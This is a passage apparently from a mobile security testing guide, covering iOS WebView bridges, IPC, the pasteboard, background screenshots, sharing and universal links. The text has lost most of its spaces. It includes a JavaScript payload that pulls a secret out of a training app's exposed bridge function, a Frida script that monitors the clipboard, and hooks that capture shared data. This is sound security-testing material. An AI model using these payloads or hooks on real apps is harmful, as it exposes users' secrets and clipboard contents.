Addingascriptmessagehandlerwithname"name"(or"javaScriptBridge"intheexampleabove)causestheJavaScript functionwindow.webkit.messageHandlers.myJavaScriptMessageHandler.postMessagetobedefinedinallframesin allwebviewsthatusetheusercontentcontroller. ItcanbethenusedfromtheHTMLfilelikethis: function invokeNativeOperation(){ value1 =document.getElementById("value1").value value2 =document.getElementById("value2").value window.webkit.messageHandlers.javaScriptBridge.postMessage(["multiplyNumbers",value1,value2]); } ThecalledfunctionresidesinJavaScriptBridgeMessageHandler.swift: class JavaScriptBridgeMessageHandler:NSObject,WKScriptMessageHandler { //... case "multiplyNumbers": letarg1 =Double(messageArray[1])! letarg2 =Double(messageArray[2])! result =String(arg1 *arg2) //... letjavaScriptCallBack ="javascriptBridgeCallBack('\(functionFromJS)','\(result)')" message.webView?.evaluateJavaScript(javaScriptCallBack,completionHandler:nil) TheproblemhereisthattheJavaScriptBridgeMessageHandlernotonlycontainsthatfunction,italsoexposesasensitive function: 475\ncase "getSecret": result ="XSRSOGKC342" Dynamic Analysis At this point you’ve surely identified all potentially interesting WebViews in the iOS app and got an overview of the potentialattacksurface(viastaticanalysis,thedynamicanalysistechniquesthatwehaveseeninprevioussectionsora combinationofthem). ThiswouldincludeHTMLandJavaScriptfiles,usageoftheJSContext/JSExportforUIWebView andWKScriptMessageHandlerforWKWebView,aswellaswhichfunctionsareexposedandpresentinaWebView. Further dynamic analysis can help you exploit those functions and get sensitive data that they might be exposing. As wehaveseeninthestaticanalysis,inthepreviousexampleitwastrivialtogetthesecretvaluebyperformingreverse engineering (the secret value was found in plain text inside the source code) but imagine that the exposed function retrievesthesecretfromsecurestorage. Inthiscase,onlydynamicanalysisandexploitationwouldhelp. TheprocedureforexploitingthefunctionsstartswithproducingaJavaScriptpayloadandinjectingitintothefilethatthe appisrequesting. Theinjectioncanbeaccomplishedviavarioustechniques,forexample: • IfsomeofthecontentisloadedinsecurelyfromtheInternetoverHTTP(mixedcontent),youcantrytoimplement aMITMattack. • YoucanalwaysperformdynamicinstrumentationandinjecttheJavaScriptpayloadbyusingframeworkslikeFrida and the corresponding JavaScript evaluation functions available for the iOS WebViews (stringByEvaluating- JavaScriptFromString: forUIWebViewandevaluateJavaScript:completionHandler: forWKWebView). In order to get the secret from the previous example of the “Where’s My Browser?” app, you can use one of these techniquestoinjectthefollowingpayloadthatwillrevealthesecretbywritingittothe“result”fieldoftheWebView: function javascriptBridgeCallBack(name,value){ document.getElementById("result").innerHTML=value; }; window.webkit.messageHandlers.javaScriptBridge.postMessage(["getSecret"]); Ofcourse,youmayalsousetheExploitationHelperitprovides: 476\nSeeanotherexampleforavulnerableiOSappandfunctionthatisexposedtoaWebViewin[#thiel2]page156. Determining Whether Sensitive Data Is Exposed via IPC Mechanisms Platform: ios MASVSV1: MSTG-STORAGE-6 MASVSV2: MASVS-PLATFORM-1 477\nOverview Static Analysis The following section summarizes keywords that you should look for to identify IPC implementations within iOS source code. XPC Services SeveralclassesmaybeusedtoimplementtheNSXPCConnectionAPI: • NSXPCConnection • NSXPCInterface • NSXPCListener • NSXPCListenerEndpoint Youcansetsecurityattributesfortheconnection. Theattributesshouldbeverified. CheckforthefollowingtwofilesintheXcodeprojectfortheXPCServicesAPI(whichisC-based): • xpc.h • connection.h Mach Ports Keywordstolookforinlow-levelimplementations: • mach_port_t • mach_msg_* Keywordstolookforinhigh-levelimplementations(CoreFoundationandFoundationwrappers): • CFMachPort • CFMessagePort • NSMachPort • NSMessagePort NSFileCoordinator Keywordstolookfor: • NSFileCoordinator Dynamic Analysis VerifyIPCmechanismswithstaticanalysisoftheiOSsourcecode. NoiOStooliscurrentlyavailabletoverifyIPCusage. Testing UIPasteboard Platform: ios MASVSV1: MSTG-PLATFORM-4 MASVSV2: MASVS-PLATFORM-1 478\nOverview Static Analysis The systemwide general pasteboard can be obtained by using generalPasteboard, search the source code or the compiledbinaryforthismethod. Usingthesystemwidegeneralpasteboardshouldbeavoidedwhendealingwithsensitive data. Custom pasteboards can be created with pasteboardWithName:create: or pasteboardWithUniqueName. Verify if custom pasteboards are set to be persistent as this is deprecated since iOS 10. A shared container should be used instead. Inaddition,thefollowingcanbeinspected: • CheckifpasteboardsarebeingremovedwithremovePasteboardWithName:,whichinvalidatesanapppasteboard, freeingupallresourcesusedbyit(noeffectforthegeneralpasteboard). • Checkifthereareexcludedpasteboards,thereshouldbeacalltosetItems:options: withtheUIPasteboardOp- tionLocalOnlyoption. • Checkifthereareexpiringpasteboards,thereshouldbeacalltosetItems:options: withtheUIPasteboardOp- tionExpirationDateoption. • Checkiftheappswipesthepasteboarditemswhengoingtobackgroundorwhenterminating. Thisisdonebysome passwordmanagerappstryingtorestrictsensitivedataexposure. Dynamic Analysis Detect Pasteboard Usage Hookortracethefollowing: • generalPasteboardforthesystem-widegeneralpasteboard. • pasteboardWithName:create: andpasteboardWithUniqueNameforcustompasteboards. Detect Persistent Pasteboard Usage HookortracethedeprecatedsetPersistent: methodandverifyifit’sbeingcalled. Monitoring and Inspecting Pasteboard Items Whenmonitoringthepasteboards,thereisseveraldetailsthatmaybedynamicallyretrieved: • ObtainpasteboardnamebyhookingpasteboardWithName:create: andinspectingitsinputparametersorpaste- boardWithUniqueNameandinspectingitsreturnvalue. • Getthefirstavailablepasteboarditem: e.g.forstringsusestringmethod. Oruseanyoftheothermethodsfor thestandarddatatypes. • GetthenumberofitemswithnumberOfItems. • Checkforexistenceofstandarddatatypeswiththeconveniencemethods,e.g.hasImages,hasStrings,hasURLs (startinginiOS10). • Check for other data types (typically UTIs) with containsPasteboardTypes: inItemSet:. You may inspect for moreconcretedatatypeslike,forexampleanpictureaspublic.pngandpublic.tiff(UTIs)orforcustomdatasuch ascom.mycompany.myapp.mytype. Rememberthat,inthiscase,onlythoseappsthatdeclareknowledgeofthe typeareabletounderstandthedatawrittentothepasteboard. Thisisthesameaswehaveseeninthe“UIActivity Sharing”section. RetrievethemusingitemSetWithPasteboardTypes: andsettingthecorrespondingUTIs. • CheckforexcludedorexpiringitemsbyhookingsetItems:options: andinspectingitsoptionsforUIPasteboar- dOptionLocalOnlyorUIPasteboardOptionExpirationDate. Ifonlylookingforstringsyoumaywanttouseobjection’scommandios pasteboard monitor: Hooks into the iOS UIPasteboard class and polls the generalPasteboard every 5 seconds for data. If new data is found,differentfromthepreviouspoll,thatdatawillbedumpedtoscreen. 479\nYoumayalsobuildyourownpasteboardmonitorthatmonitorsspecificinformationasseenabove. Forexample,thisscript(inspiredfromthescriptbehindobjection’spasteboardmonitor)readsthepasteboarditemsevery 5seconds,ifthere’ssomethingnewitwillprintit: const UIPasteboard =ObjC.classes.UIPasteboard; const Pasteboard =UIPasteboard.generalPasteboard(); varitems =""; varcount =Pasteboard.changeCount().toString(); setInterval(function (){ const currentCount =Pasteboard.changeCount().toString(); const currentItems =Pasteboard.items().toString(); if(currentCount ===count){ return;} items =currentItems; count =currentCount; console.log('[*Pasteboardchanged]count:' +count + 'hasStrings:' +Pasteboard.hasStrings().toString()+ 'hasURLs:' +Pasteboard.hasURLs().toString()+ 'hasImages:' +Pasteboard.hasImages().toString()); console.log(items); },1000 *5); Intheoutputwecanseethefollowing: [*Pasteboardchanged]count:64hasStrings:truehasURLs:falsehasImages:false ( { "public.utf8-plain-text" =hola; } ) [*Pasteboardchanged]count:65hasStrings:truehasURLs:truehasImages:false ( { "public.url" ="https://codeshare.frida.re/"; "public.utf8-plain-text" ="https://codeshare.frida.re/"; } ) [*Pasteboardchanged]count:66hasStrings:falsehasURLs:falsehasImages:true ( { "com.apple.uikit.image" ="<UIImage:0x1c42b23c0>size{571,264}orientation0scale1.000000"; "public.jpeg" ="<UIImage:0x1c44a1260>size{571,264}orientation0scale1.000000"; "public.png" ="<UIImage:0x1c04aaaa0>size{571,264}orientation0scale1.000000"; } ) Youseethatfirstatextwascopiedincludingthestring“hola”,afterthataURLwascopiedandfinallyapicturewascopied. SomeofthemareavailableviadifferentUTIs. OtherappswillconsidertheseUTIstoallowpastingofthisdataornot. Testing for Sensitive Functionality Exposure Through IPC Platform: ios MASVSV1: MSTG-PLATFORM-4 MASVSV2: MASVS-PLATFORM-1 Testing Auto-Generated Screenshots for Sensitive Information Platform: ios MASVSV1: MSTG-STORAGE-9 MASVSV2: MASVS-PLATFORM-3 480\nOverview Static Analysis Ifyouhavethesourcecode,searchfortheapplicationDidEnterBackgroundmethodtodeterminewhethertheapplica- tionsanitizesthescreenbeforebeingbackgrounded. Thefollowingisasampleimplementationusingadefaultbackgroundimage(overlayImage.png)whenevertheapplica- tionisbackgrounded,overridingthecurrentview: Swift: private varbackgroundImage:UIImageView? func applicationDidEnterBackground(_application:UIApplication){ letmyBanner =UIImageView(image:#imageLiteral(resourceName:"overlayImage")) myBanner.frame =UIScreen.main.bounds backgroundImage =myBanner window?.addSubview(myBanner) } func applicationWillEnterForeground(_application:UIApplication){ backgroundImage?.removeFromSuperview() } Objective-C: @property (UIImageView *)backgroundImage; -(void)applicationDidEnterBackground:(UIApplication *)application { UIImageView *myBanner =[[UIImageViewalloc]initWithImage:@"overlayImage.png"]; self.backgroundImage =myBanner; self.backgroundImage.bounds =UIScreen.mainScreen.bounds; [self.windowaddSubview:myBanner]; } -(void)applicationWillEnterForeground:(UIApplication *)application { [self.backgroundImageremoveFromSuperview]; } ThissetsthebackgroundimagetooverlayImage.pngwhenevertheapplicationisbackgrounded. Itpreventssensitive dataleaksbecauseoverlayImage.pngwillalwaysoverridethecurrentview. Dynamic Analysis YoucanuseavisualapproachtoquicklyvalidatethistestcaseusinganyiOSdevice(jailbrokenornot): 1. Navigate to an application screen that displays sensitive information, such as a username, an email address, or accountdetails. 2. BackgroundtheapplicationbyhittingtheHomebuttononyouriOSdevice. 3. Verifythatadefaultimageisshownasthetopviewelementinsteadoftheviewcontainingthesensitiveinformation. If required, you may also collect evidence by performing steps 1 to 3 on a jailbroken device or a non-jailbroken device afterrepackagingtheappwiththeFridaGadget. Afterthat, connecttotheiOSdeviceperSSHorbyothermeansand navigatetotheSnapshotsdirectory. ThelocationmaydifferoneachiOSversionbutit’susuallyinsidetheapp’sLibrary directory. Forinstance,oniOS14.5theSnapshotsdirectoryislocatedat: /var/mobile/Containers/Data/Application/$APP_ID/Library/SplashBoard/Snapshots/sceneID:$APP_NAME-default/ Thescreenshotsinsidethatfoldershouldnotcontainanysensitiveinformation. Testing UIActivity Sharing 481\nPlatform: ios MASVSV1: MSTG-PLATFORM-4 MASVSV2: MASVS-PLATFORM-1 Overview Static Analysis Sending Items WhentestingUIActivitySharingyoushouldpayspecialattentionto: • thedata(items)beingshared, • thecustomactivities, • theexcludedactivitytypes. Data sharing via UIActivity works by creating a UIActivityViewController and passing it the desired items (URLs, text,apicture)oninit(activityItems: applicationActivities:). Aswementionedbefore,itispossibletoexcludesomeofthesharingmechanismsviathecontroller’sexcludedActiv- ityTypesproperty. ItishighlyrecommendedtodothetestsusingthelatestversionsofiOSasthenumberofactivity typesthatcanbeexcludedcanincrease. Thedevelopershavetobeawareofthisandexplicitlyexcludetheonesthat arenotappropriatefortheappdata. Someactivitytypesmightnotbeevendocumentedlike“CreateWatchFace”. Ifhavingthesourcecode,youshouldtakealookattheUIActivityViewController: • Inspecttheactivitiespassedtotheinit(activityItems:applicationActivities:) method. • Checkifitdefinescustomactivities(alsobeingpassedtothepreviousmethod). • VerifytheexcludedActivityTypes,ifany. Ifyouonlyhavethecompiled/installedapp,trysearchingforthepreviousmethodandproperty,forexample: $rabin2 -zqTelegram\X.app/Telegram\X |grep -iactivityItems 0x1000df0344544initWithActivityItems:applicationActivities: Receiving Items Whenreceivingitems,youshouldcheck: • iftheappdeclarescustomdocumenttypesbylookingintoExported/ImportedUTIs(“Info”taboftheXcodeproject). ThelistofallsystemdeclaredUTIs(UniformTypeIdentifiers)canbefoundinthearchivedAppleDeveloperDocu- mentation. • iftheappspecifiesanydocumenttypesthatitcanopenbylookingintoDocumentTypes(“Info”taboftheXcode project). Ifpresent,theyconsistofnameandoneormoreUTIsthatrepresentthedatatype(e.g.“public.png”for PNGfiles). iOSusesthistodetermineiftheappiseligibletoopenagivendocument(specifyingExported/Imported UTIsisnotenough). • iftheappproperlyverifiesthereceiveddatabylookingintotheimplementationofapplication:openURL:options: (oritsdeprecatedversionUIApplicationDelegate application:openURL:sourceApplication:annotation:) in theappdelegate. IfnothavingthesourcecodeyoucanstilltakealookintotheInfo.plistfileandsearchfor: • UTExportedTypeDeclarations/UTImportedTypeDeclarationsiftheappdeclaresexported/importedcustomdoc- umenttypes. • CFBundleDocumentTypestoseeiftheappspecifiesanydocumenttypesthatitcanopen. AverycompleteexplanationabouttheuseofthesekeyscanbefoundonStackoverflow. Let’sseeareal-worldexample. WewilltakeaFileManagerappandtakealookatthesekeys. Weusedobjectionhereto readtheInfo.plistfile. 482\nobjection --gadget SomeFileManagerruniosplistcatInfo.plist NotethatthisisthesameasifwewouldretrievetheIPAfromthephoneoraccessedviae.g.SSHandnavigated tothecorrespondingfolderintheIPA/appsandbox. However,withobjectionwearejustonecommandawayfrom ourgoalandthiscanbestillconsideredstaticanalysis. Thefirstthingwenoticedisthatappdoesnotdeclareanyimportedcustomdocumenttypesbutwecouldfindacouple ofexportedones: UTExportedTypeDeclarations= ( { UTTypeConformsTo= ( "public.data" ); UTTypeDescription="SomeFileManagerFiles"; UTTypeIdentifier="com.some.filemanager.custom"; UTTypeTagSpecification= { "public.filename-extension"= ( ipa, deb, zip, rar, tar, gz, ... key, pem, p12, cer ); }; } ); TheappalsodeclaresthedocumenttypesitopensaswecanfindthekeyCFBundleDocumentTypes: CFBundleDocumentTypes= ( { ... CFBundleTypeName="SomeFileManagerFiles"; LSItemContentTypes= ( "public.content", "public.data", "public.archive", "public.item", "public.database", "public.calendar-event", ... ); } ); We can see that this File Manager will try to open anything that conforms to any of the UTIs listed in LSItemContent- Typesandit’sreadytoopenfileswiththeextensionslistedinUTTypeTagSpecification/"public.filename-extension". Pleasetakeanoteofthisbecauseitwillbeusefulifyouwanttosearchforvulnerabilitieswhendealingwiththedifferent typesoffileswhenperformingdynamicanalysis. Dynamic Analysis Sending Items Therearethreemainthingsyoucaneasilyinspectbyperformingdynamicinstrumentation: • TheactivityItems: anarrayoftheitemsbeingshared. Theymightbeofdifferenttypes,e.g.onestringandone picturetobesharedviaamessagingapp. • TheapplicationActivities: anarrayofUIActivityobjectsrepresentingtheapp’scustomservices. • TheexcludedActivityTypes: anarrayoftheActivityTypesthatarenotsupported,e.g.postToFacebook. Toachievethisyoucandotwothings: 483\n• Hookthemethodwehaveseeninthestaticanalysis(init(activityItems: applicationActivities:)) toget theactivityItemsandapplicationActivities. • FindouttheexcludedactivitiesbyhookingexcludedActivityTypesproperty. Let’sseeanexampleusingTelegramtoshareapictureandatextfile. Firstpreparethehooks,wewillusetheFridaREPL andwriteascriptforthis: Interceptor.attach( ObjC.classes. UIActivityViewController['-initWithActivityItems:applicationActivities:'].implementation,{ onEnter:function (args){ printHeader(args) this.initWithActivityItems =ObjC.Object(args[2]); this.applicationActivities =ObjC.Object(args[3]); console.log("initWithActivityItems:" +this.initWithActivityItems); console.log("applicationActivities:" +this.applicationActivities); }, onLeave:function (retval){ printRet(retval); } }); Interceptor.attach( ObjC.classes.UIActivityViewController['-excludedActivityTypes'].implementation,{ onEnter:function (args){ printHeader(args) }, onLeave:function (retval){ printRet(retval); } }); function printHeader(args){ console.log(Memory.readUtf8String(args[1])+"@" +args[1]) }; function printRet(retval){ console.log('RET@' +retval +':' ); try{ console.log(newObjC.Object(retval).toString()); }catch (e){ console.log(retval.toString()); } }; YoucanstorethisasaJavaScriptfile,e.g.inspect_send_activity_data.jsandloaditlikethis: frida -UTelegram -linspect_send_activity_data.js Nowobservetheoutputwhenyoufirstshareapicture: [*]initWithActivityItems:applicationActivities:@0x18c130c07 initWithActivityItems:( "<UIImage:0x1c4aa0b40>size{571,264}orientation0scale1.000000" ) applicationActivities:nil RET@ 0x13cb2b800: <UIActivityViewController:0x13cb2b800> [*]excludedActivityTypes@ 0x18c0f8429 RET@ 0x0: nil andthenatextfile: [*]initWithActivityItems:applicationActivities:@0x18c130c07 initWithActivityItems:( "<QLActivityItemProvider:0x1c4a30140>", "<UIPrintInfo:0x1c0699a50>" ) applicationActivities:( ) RET@ 0x13c4bdc00: <_UIDICActivityViewController:0x13c4bdc00> [*]excludedActivityTypes@ 0x18c0f8429 484\nRET@ 0x1c001b1d0: ( "com.apple.UIKit.activity.MarkupAsPDF" ) Youcanseethat: • Forthepicture,theactivityitemisaUIImageandtherearenoexcludedactivities. • Forthetextfiletherearetwodifferentactivityitemsandcom.apple.UIKit.activity. MarkupAsPDFisexcluded. In the previous example, there were no custom applicationActivities and only one excluded activity. However, to betterillustratewhatyoucanexpectfromotherappswehavesharedapictureusinganotherapp,hereyoucanseea bunchofapplicationactivitiesandexcludedactivities(outputwaseditedtohidethenameoftheoriginatingapp): [*]initWithActivityItems:applicationActivities:@0x18c130c07 initWithActivityItems:( "<SomeActivityItemProvider:0x1c04bd580>" ) applicationActivities:( "<SomeActionItemActivityAdapter:0x141de83b0>", "<SomeActionItemActivityAdapter:0x147971cf0>", "<SomeOpenInSafariActivity:0x1479f0030>", "<SomeOpenInChromeActivity:0x1c0c8a500>" ) RET@ 0x142138a00: <SomeActivityViewController:0x142138a00> [*]excludedActivityTypes@ 0x18c0f8429 RET@ 0x14797c3e0: ( "com.apple.UIKit.activity.Print", "com.apple.UIKit.activity.AssignToContact", "com.apple.UIKit.activity.SaveToCameraRoll", "com.apple.UIKit.activity.CopyToPasteboard", ) Receiving Items After performing the static analysis you would know the document types that the app can open and if it declares any customdocumenttypesand(partof)themethodsinvolved. Youcanusethisnowtotestthereceivingpart: • ShareafilewiththeappfromanotherapporsenditviaAirDropore-mail. Choosethefilesothatitwilltriggerthe “Openwith...”dialogue(thatis,thereisnodefaultappthatwillopenthefile,aPDFforexample). • Hookapplication:openURL:options: andanyothermethodsthatwereidentifiedinapreviousstaticanalysis. • Observetheappbehavior. • Inaddition,youcouldsendspecificmalformedfilesand/oruseafuzzingtechnique. Toillustratethiswithanexamplewehavechosenthesamereal-worldfilemanagerappfromthestaticanalysissection andfollowedthesesteps: 1. SendaPDFfilefromanotherAppledevice(e.g.aMacBook)viaAirdrop. 2. WaitfortheAirDroppopuptoappearandclickonAccept. 3. Asthereisnodefaultappthatwillopenthefile,itswitchestotheOpenwith...popup. There,wecanselecttheapp thatwillopenourfile. Thenextscreenshotshowsthis(wehavemodifiedthedisplaynameusingFridatoconceal theapp’srealname): 485\n4. AfterselectingSomeFileManagerwecanseethefollowing: (0x1c4077000) -[AppDelegateapplication:openURL:options:] application: <UIApplication:0x101c00950> openURL:file:///var/mobile/Library/Application%20Support /Containers/com.some.filemanager/Documents/Inbox/OWASP_MASVS.pdf options:{ UIApplicationOpenURLOptionsAnnotationKey= { LSMoveDocumentOnOpen= 1; }; UIApplicationOpenURLOptionsOpenInPlaceKey= 0; UIApplicationOpenURLOptionsSourceApplicationKey= "com.apple.sharingd"; "_UIApplicationOpenURLOptionsSourceProcessHandleKey" ="<FBSProcessHandle:0x1c3a63140; sharingd:605;valid:YES>"; } 0x18c7930d8UIKit!__58-[UIApplication _applicationOpenURLAction:payload:origin:]_block_invoke ... 0x1857cdc34FrontBoardServices!-[FBSSerialQueue _performNextFromRunLoopSource] RET:0x1 Asyou cansee, thesending applicationiscom.apple.sharingd andthe URL’sscheme isfile://. Note that oncewe selecttheappthatshouldopenthefile,thesystemalreadymovedthefiletothecorrespondingdestination,thatistothe app’sInbox. TheappsarethenresponsiblefordeletingthefilesinsidetheirInboxes. Thisapp,forexample,movesthe 486\nfileto/var/mobile/Documents/andremovesitfromtheInbox. (0x1c002c760) -[XXFileManagermoveItemAtPath:toPath:error:] moveItemAtPath:/var/mobile/Library/ApplicationSupport/Containers /com.some.filemanager/Documents/Inbox/OWASP_MASVS.pdf toPath:/var/mobile/Documents/OWASP_MASVS (1).pdf error:0x16f095bf8 0x100f24e90SomeFileManager!-[AppDelegate__handleOpenURL:] 0x100f25198SomeFileManager!-[AppDelegateapplication:openURL:options:] 0x18c7930d8UIKit!__58-[UIApplication_applicationOpenURLAction:payload:origin:]_block_invoke ... 0x1857cd9f4FrontBoardServices!__FBSSERIALQUEUE_IS_CALLING_OUT_TO_A_BLOCK__ RET:0x1 Ifyoulookatthestacktrace,youcanseehowapplication:openURL:options: called__handleOpenURL:,whichcalled moveItemAtPath:toPath:error:. Noticethatwehavenowthisinformationwithouthavingthesourcecodeforthetarget app. Thefirstthingthatwehadtodowasclear: hookapplication:openURL:options:. Regardingtherest,wehadto thinkalittlebitandcomeupwithmethodsthatwecouldstarttracingandarerelatedtothefilemanager,forexample, all methods containing the strings “copy”, “move”, “remove”, etc. until we have found that the one being called was moveItemAtPath:toPath:error:. AfinalthingworthnoticinghereisthatthiswayofhandlingincomingfilesisthesameforcustomURLschemes. Please refertothe“TestingCustomURLSchemes”sectionformoreinformation. Testing Universal Links Platform: ios MASVSV1: MSTG-PLATFORM-4 MASVSV2: MASVS-PLATFORM-1 Overview Static Analysis Testinguniversallinksonastaticapproachincludesdoingthefollowing: • CheckingtheAssociatedDomainsentitlement • RetrievingtheAppleAppSiteAssociationfile • Checkingthelinkreceivermethod • Checkingthedatahandlermethod • Checkingiftheappiscallingotherapp’suniversallinks Checking the Associated Domains Entitlement UniversallinksrequirethedevelopertoaddtheAssociatedDomainsentitlementandincludeinitalistofthedomains thattheappsupports. InXcode,gototheCapabilitiestabandsearchforAssociatedDomains. Youcanalsoinspectthe.entitlementsfile lookingforcom.apple.developer.associated-domains. Eachofthedomainsmustbeprefixedwithapplinks:,suchas applinks:www.mywebsite.com. Here’sanexamplefromTelegram’s.entitlementsfile: <key>com.apple.developer.associated-domains</key> <array> <string>applinks:telegram.me</string> <string>applinks:t.me</string> </array> MoredetailedinformationcanbefoundinthearchivedAppleDeveloperDocumentation. Ifyoudon’thavetheoriginalsourcecodeyoucanstillsearchforthem,asexplainedin“EntitlementsEmbeddedinthe CompiledAppBinary”. 487\nRetrieving the Apple App Site Association File Try to retrieve the apple-app-site-association file from the server using the associated domains you got from the previousstep. ThisfileneedstobeaccessibleviaHTTPS,withoutanyredirects,athttps://<domain>/apple-app-site- associationorhttps://<domain>/.well-known/apple-app-site-association. You can retrieve it yourself using your browser and navigating to https://<domain>/apple-app-site-association, https://<domain>/.well-known/apple-app-site-association or using Apple’s CDN at https://app-site- association.cdn-apple.com/a/v1/<domain>. Alternatively,youcanusetheAppleAppSiteAssociation(AASA)Validator. Afterenteringthedomain,itwilldisplaythe file,verifyitforyouandshowtheresults(e.g.ifitisnotbeingproperlyservedoverHTTPS).Seethefollowingexample fromapple.comhttps://www.apple.com/.well-known/apple-app-site-association: { "activitycontinuation":{ "apps":[ "W74U47NE8E.com.apple.store.Jolly" ] }, "applinks":{ "apps":[], "details":[ { "appID":"W74U47NE8E.com.apple.store.Jolly", "paths":[ "NOT/shop/buy-iphone/*", "NOT/us/shop/buy-iphone/*", "/xc/*", "/shop/buy-*", "/shop/product/*", "/shop/bag/shared_bag/*", "/shop/order/list", "/today", "/shop/watch/watch-accessories", "/shop/watch/watch-accessories/*", "/shop/watch/bands", ]}]} } The “details” key inside “applinks” contains a JSON representation of an array that might contain one or more apps. The“appID”shouldmatchthe“application-identifier”keyfromtheapp’sentitlements. Next,usingthe“paths”key,the developers can specify certain paths to be handled on a per app basis. Some apps, like Telegram use a standalone * ("paths":["*"])inordertoallowallpossiblepaths. Onlyifspecificareasofthewebsiteshouldnotbehandledbysome app,thedevelopercanrestrictaccessbyexcludingthembyprependinga"NOT"(notethewhitespaceaftertheT)tothe correspondingpath. Alsorememberthatthesystemwilllookformatchesbyfollowingtheorderofthedictionariesinthe array(firstmatchwins). Thispathexclusionmechanismisnottobeseenasasecurityfeaturebutratherasafilterthatdevelopermightuseto specifywhichappsopenwhichlinks. Bydefault,iOSdoesnotopenanyunverifiedlinks. Rememberthatuniversallinksverificationoccursatinstallationtime. iOSretrievestheAASAfileforthedeclareddomains (applinks) in its com.apple.developer.associated-domains entitlement. iOS will refuse to open those links if the verificationdidnotsucceed. Somereasonstofailverificationmightinclude: 488\n• TheAASAfileisnotservedoverHTTPS. • TheAASAisnotavailable. • TheappIDsdonotmatch(thiswouldbethecaseofamaliciousapp). iOSwouldsuccessfullypreventanypossible hijackingattacks. Checking the Link Receiver Method Inordertoreceivelinksandhandlethemappropriately,theappdelegatehastoimplementapplication:continueUserActivity:restorationHandler:. Ifyouhavetheoriginalprojecttrysearchingforthismethod. PleasenotethatiftheappusesopenURL:options:completionHandler: toopenauniversallinktotheapp’swebsite, thelinkwon’topenintheapp. Asthecalloriginatesfromtheapp,itwon’tbehandledasauniversallink. FromAppleDocs: WheniOSlaunchesyourappafterausertapsauniversallink,youreceiveanNSUserActivity objectwithanactivityTypevalueofNSUserActivityTypeBrowsingWeb. Theactivityobject’swebpageURLproperty containstheURLthattheuserisaccessing. ThewebpageURLpropertyalwayscontainsanHTTPorHTTPSURL,and you can use NSURLComponents APIs to manipulate the components of the URL. [...] To protect users’ privacy and security,youshouldnotuseHTTPwhenyouneedtotransportdata;instead,useasecuretransportprotocolsuch asHTTPS. Fromthenoteabovewecanhighlightthat: • ThementionedNSUserActivityobjectcomesfromthecontinueUserActivityparameter,asseeninthemethod above. • TheschemeofthewebpageURLmustbeHTTPorHTTPS(anyotherschemeshouldthrowanexception). Thescheme instancepropertyofURLComponents/NSURLComponentscanbeusedtoverifythis. Ifyoudon’thavetheoriginalsourcecodeyoucanuseradare2orrabin2tosearchthebinarystringsforthelinkreceiver method: $rabin2 -zqTelegram\X.app/Telegram\X |grep restorationHan 0x1000deea95352application:continueUserActivity:restorationHandler: Checking the Data Handler Method Youshouldcheckhowthereceiveddataisvalidated. Appleexplicitlywarnsaboutthis: Universallinksofferapotentialattackvectorintoyourapp,somakesuretovalidateallURLparametersanddiscard anymalformedURLs. Inaddition,limittheavailableactionstothosethatdonotrisktheuser’sdata. Forexample, donotallowuniversallinkstodirectlydeletecontentoraccesssensitiveinformationabouttheuser. Whentesting yourURL-handlingcode,makesureyourtestcasesincludeimproperlyformattedURLs. AsstatedintheAppleDeveloperDocumentation,wheniOSopensanappastheresultofauniversallink,theappreceives anNSUserActivityobjectwithanactivityTypevalueofNSUserActivityTypeBrowsingWeb. Theactivityobject’sweb- pageURLpropertycontainstheHTTPorHTTPSURLthattheuseraccesses. ThefollowingexampleinSwiftverifiesexactly thisbeforeopeningtheURL: funcapplication(_application:UIApplication,continueuserActivity:NSUserActivity, restorationHandler:@escaping([UIUserActivityRestoring]?)->Void)->Bool{ //... ifuserActivity.activityType==NSUserActivityTypeBrowsingWeb,leturl=userActivity.webpageURL{ application.open(url,options:[:],completionHandler:nil) } returntrue } Inaddition,rememberthatiftheURLincludesparameters,theyshouldnotbetrustedbeforebeingcarefullysanitizedand validated(evenwhencomingfromtrusteddomain). Forexample,theymighthavebeenspoofedbyanattackerormight includemalformeddata. Ifthatisthecase,thewholeURLandthereforetheuniversallinkrequestmustbediscarded. 489\nTheNSURLComponentsAPIcanbeusedtoparseandmanipulatethecomponentsoftheURL.Thiscanbealsopartofthe methodapplication:continueUserActivity:restorationHandler: itselformightoccuronaseparatemethodbeing calledfromit. Thefollowingexampledemonstratesthis: funcapplication(_application:UIApplication, continueuserActivity:NSUserActivity, restorationHandler:@escaping([Any]?)->Void)->Bool{ guarduserActivity.activityType==NSUserActivityTypeBrowsingWeb, letincomingURL=userActivity.webpageURL, letcomponents=NSURLComponents(url:incomingURL,resolvingAgainstBaseURL:true), letpath=components.path, letparams=components.queryItemselse{ returnfalse } ifletalbumName=params.first(where:{$0.name=="albumname"})?.value, letphotoIndex=params.first(where:{$0.name=="index"})?.value{ //Interactwithalbumnameandphotoindex returntrue }else{ //Handlewhenalbumand/oralbumnameorphotoindexmissing returnfalse } } Finally,asstatedabove,besuretoverifythattheactionstriggeredbytheURLdonotexposesensitiveinformationorrisk theuser’sdataonanyway. Checking if the App is Calling Other App’s Universal Links Anappmightbecallingotherappsviauniversallinksinordertosimplytriggersomeactionsortotransferinformation, inthatcase,itshouldbeverifiedthatitisnotleakingsensitiveinformation. If you have the original source code, you can search it for the openURL:options: completionHandler: method and checkthedatabeinghandled. NotethattheopenURL:options:completionHandler: methodisnotonlyusedtoopenuniversallinksbutalsoto callcustomURLschemes. ThisisanexamplefromtheTelegramapp: },openUniversalUrl:{url,completionin if#available(iOS10.0,*){ varparsedUrl=URL(string:url) ifletparsed=parsedUrl{ ifparsed.scheme==nil||parsed.scheme!.isEmpty{ parsedUrl=URL(string:"https://\(url)") } } ifletparsedUrl=parsedUrl{ returnUIApplication.shared.open(parsedUrl, options:[UIApplicationOpenURLOptionUniversalLinksOnly:trueasNSNumber], completionHandler:{valueincompletion.completion(value)} ) Notehowtheappadaptstheschemeto“https”beforeopeningitandhowitusestheoptionUIApplicationOpenURLOp- tionUniversalLinksOnly: truethatopenstheURLonlyiftheURLisavaliduniversallinkandthereisaninstalledapp capableofopeningthatURL. Ifyoudon’thavetheoriginalsourcecode,searchinthesymbolsandinthestringsoftheappbinary. Forexample,we willsearchforObjective-Cmethodsthatcontain“openURL”: $rabin2 -zqTelegram\X.app/Telegram\X |grep openURL 0x1000dee3f5049application:openURL:sourceApplication:annotation: 0x1000dee712928application:openURL:options: 0x1000df2c998openURL: 0x1000df7723534openURL:options:completionHandler: 490\nAsexpected,openURL:options:completionHandler: isamongtheonesfound(rememberthatitmightbealsopresent becausetheappopenscustomURLschemes). Next,toensurethatnosensitiveinformationisbeingleakedyou’llhave to perform dynamic analysis and inspect the data being transmitted. Please refer to “Identifying and Hooking the URL 